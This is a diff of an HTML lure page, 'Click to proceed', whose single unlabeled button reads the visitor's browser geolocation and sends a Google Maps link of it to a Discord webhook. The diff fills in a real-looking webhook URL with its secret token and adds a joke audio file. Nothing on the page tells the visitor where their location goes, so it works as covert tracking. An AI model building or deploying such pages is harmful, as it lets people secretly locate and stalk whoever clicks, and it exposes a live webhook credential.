@@ -35,7 +35,7 @@
     <h1>Click to proceed</h1>
     <div id="buttonContainer">        <button id="sendLocation">•</button>
     </div>
-    <audio id="audio" src="your-audio-file.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
+    <audio id="audio" src=funny.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
 
     <script>
         document.getElementById('sendLocation').addEventListener('click', function() {
@@ -45,7 +45,7 @@
                 alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const googleMapsLink =`https://www.google.com/maps/@${lat},${lon},15z`;            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+            const googleMapsLink =`https://www.google.com/maps/@${lat},${lon},15z`;            const webhookUrl = 'https://discord.com/api/webhooks/1337154258281168896/NQv_m_JccepgAedCn1Le3_QindKI_voWv9L0NoI9itCIN5bpJNwXcFzDQWZRYbXH9oFb'; // Replace with your Discord webhook URL
             const data = {
                 content:`User's Location:${googleMapsLink}`            };
 
